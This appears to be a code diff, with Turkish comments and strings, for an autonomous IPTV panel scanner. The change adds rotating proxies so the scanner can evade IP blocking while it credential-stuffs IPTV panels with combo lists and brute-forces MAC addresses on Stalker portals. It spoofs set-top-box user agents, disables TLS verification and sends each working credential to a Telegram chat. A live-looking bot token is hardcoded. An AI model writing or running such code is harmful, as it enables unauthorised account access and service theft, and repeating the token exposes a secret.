@@ -1,5 +1,6 @@
 import os
 import time
+import random
 import threading
 import requests
 from flask import Flask
@@ -13,12 +14,12 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "Otonom IPTV Tarayıcı Aktif ve Bulutta Çalışıyor!"
+    return "Otonom IPTV Tarayıcı (Proxy Destekli) Aktif!"
 
 def run_web():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
 
-# --- TELEGRAM BİLDİRİM AYARLARI (DÜZELTİLDİ) ---
+# --- TELEGRAM BİLDİRİM AYARLARI ---
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1003901042500"
 
@@ -39,15 +40,31 @@ HEADERd = {
     'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
 }
 
-def m3u_tara(panel, user, pas):
+def proxy_sec(proxy_listesi):
+    if not proxy_listesi:
+        return None
+    p = random.choice(proxy_listesi).strip()
+    if not p:
+        return None
+    # http / https proxy formatı
+    if not p.startswith("http"):
+        p = f"http://{p}"
+    return {"http": p, "https": p}
+
+def m3u_tara(panel, user, pas, proxy_listesi):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
+    proxies = proxy_sec(proxy_listesi)
     try:
-        res = requests.get(api_url, headers=HEADERd, timeout=5, verify=False)
+        if proxies:
+            res = requests.get(api_url, headers=HEADERd, timeout=6, verify=False, proxies=proxies)
+        else:
+            res = requests.get(api_url, headers=HEADERd, timeout=6, verify=False)
+            
         if res.status_code == 200 and 'user_info' in res.text:
             if '"auth":1' in res.text or '"status":"Active"' in res.text:
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
                 mesaj = (
-                    f"🔥 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
+                    f"🔥 <b>M3U HİT BULUNDU! (Proxy ile)</b>\n"
                     f"🌐 <b>Panel:</b> http://{panel}\n"
                     f"👤 <b>User:</b> <code>{user}</code>\n"
                     f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
@@ -59,14 +76,19 @@ def m3u_tara(panel, user, pas):
         pass
     return False
 
-def mac_tara(panel, mac):
+def mac_tara(panel, mac, proxy_listesi):
     mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
     headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
+    proxies = proxy_sec(proxy_listesi)
     try:
-        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
+        if proxies:
+            res = requests.get(mac_url, headers=headers, timeout=6, verify=False, proxies=proxies)
+        else:
+            res = requests.get(mac_url, headers=headers, timeout=6, verify=False)
+            
         if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
             mesaj = (
-                f"🔥 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
+                f"🔥 <b>MAC HİT BULUNDU! (Proxy ile)</b>\n"
                 f"🌐 <b>Panel:</b> http://{panel}\n"
                 f"🎯 <b>MAC:</b> <code>{mac}</code>"
             )
@@ -77,34 +99,43 @@ def mac_tara(panel, mac):
     return False
 
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Tarayıcı Başlatıldı ve GitHub Verileri Bekleniyor...")
-    telegrama_gonder("🚀 <b>IPTV Botu başarıyla başlatıldı, tarama turları dönüyor!</b>")
+    print("[*] Proxy Destekli Bulut Otonom Tarayıcı Başlatıldı...")
+    telegrama_gonder("🚀 <b>Proxy Destekli IPTV Botu Başlatıldı!</b>")
     
     MAC_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/mac_list/MAC.txt"
     PANEL_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/panel_list/benzersiz_paneller.txt"
     COMBO_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/combo/userpass.txt"
+    PROXY_RAW_URL = "https://raw.githubusercontent.com/harnest/otonomtarayici-1/main/proxy/proxy.txt"
     
     while True:
         try:
-            print("[i] GitHub'dan güncel veriler çekiliyor...")
+            print("[i] GitHub'dan güncel veriler ve proxy'ler çekiliyor...")
             
+            # Proxy listesini çek
+            proksiler = []
+            try:
+                r_proxy = requests.get(PROXY_RAW_URL, timeout=10)
+                if r_proxy.status_code == 200:
+                    proksiler = [p.strip() for p in r_proxy.text.splitlines() if p.strip()]
+                    print(f"[+] GitHub'dan {len(proksiler)} adet proxy yüklendi.")
+            except Exception as e:
+                print(f"[!] Proxy'ler çekilemedi (Direkt IP ile devam edilecek): {e}")
+
             maclar = []
             try:
                 r_mac = requests.get(MAC_RAW_URL, timeout=10)
                 if r_mac.status_code == 200:
                     maclar = [m.strip() for m in r_mac.text.splitlines() if m.strip()]
-                    print(f"[+] GitHub'dan {len(maclar)} adet MAC yüklendi.")
-            except Exception as e:
-                print(f"[!] MAC'ler çekilemedi: {e}")
+            except:
+                pass
 
             paneller = []
             try:
                 r_panel = requests.get(PANEL_RAW_URL, timeout=10)
                 if r_panel.status_code == 200:
                     paneller = [p.strip().replace('http://', '').replace('https://', '') for p in r_panel.text.splitlines() if p.strip()]
-                    print(f"[+] GitHub'dan {len(paneller)} adet panel yüklendi.")
-            except Exception as e:
-                print(f"[!] Paneller çekilemedi: {e}")
+            except:
+                pass
 
             combolar = []
             try:
@@ -115,9 +146,8 @@ def arka_plan_tarayici():
                         if ":" in satir:
                             parca = satir.split(":", 1)
                             combolar.append((parca[0].strip(), parca[1].strip()))
-                    print(f"[+] GitHub'dan {len(combolar)} adet combo (user:pass) yüklendi.")
-            except Exception as e:
-                print(f"[!] Combolar çekilemedi: {e}")
+            except:
+                pass
 
             if not paneller and not maclar and not combolar:
                 print("[!] Uyarı: GitHub'dan veri alınamadı, 5 dakika sonra tekrar denenecek...")
@@ -125,17 +155,17 @@ def arka_plan_tarayici():
                 continue
 
             if maclar and paneller:
-                print("[i] MAC taraması başlatılıyor...")
+                print("[i] Proxy destekli MAC taraması başlatılıyor...")
                 for panel in paneller:
                     for mac in maclar:
-                        mac_tara(panel, mac)
+                        mac_tara(panel, mac, proksiler)
                         time.sleep(0.3)
 
             if combolar and paneller:
-                print("[i] M3U (User/Pass) taraması başlatılıyor...")
+                print("[i] Proxy destekli M3U taraması başlatılıyor...")
                 for panel in paneller:
                     for user, pas in combolar:
-                        m3u_tara(panel, user, pas)
+                        m3u_tara(panel, user, pas, proksiler)
                         time.sleep(0.3)
 
             print("[i] Tüm turlar tamamlandı, 15 dakika sonra tekrar taranacak...")
